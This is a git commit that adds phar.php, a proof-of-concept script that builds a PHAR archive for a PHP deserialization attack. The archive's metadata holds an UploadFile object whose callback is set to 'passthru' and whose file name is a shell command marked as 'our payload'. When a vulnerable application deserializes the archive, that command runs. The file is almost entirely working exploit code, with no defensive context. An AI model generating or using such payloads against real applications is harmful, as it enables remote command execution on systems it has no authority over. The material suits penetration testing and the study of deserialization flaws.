659523553655e793e591a12c5f8705e16007b79b
AssassinUKG <more4money@gmail.com>
2021-03-31 01:34:07 +0100

    Create phar.php

---
+++ phar.php
@@ -0,0 +1,27 @@
+<?php
+class UploadFile{ }
+
+//Create a new instance of the Dummy class and modify its property
+$dummy = new UploadFile();
+$dummy->callback = "passthru";
+$dummy->fileName = "uname -a > pwned"; //our payload
+
+// Delete any existing PHAR archive with that name
+@unlink("poc.phar");
+
+// Create a new archive
+$poc = new Phar("poc.phar");
+
+// Add all write operations to a buffer, without modifying the archive on disk
+$poc->startBuffering();
+
+// Set the stub
+$poc->setStub("<?php echo 'Here is the STUB!'; __HALT_COMPILER();");
+
+/* Add a new file in the archive with "text" as its content*/
+$poc["file"] = "text";
+// Add the dummy object to the metadata. This will be serialized
+$poc->setMetadata($dummy);
+// Stop buffering and write changes to disk
+$poc->stopBuffering();
+?>
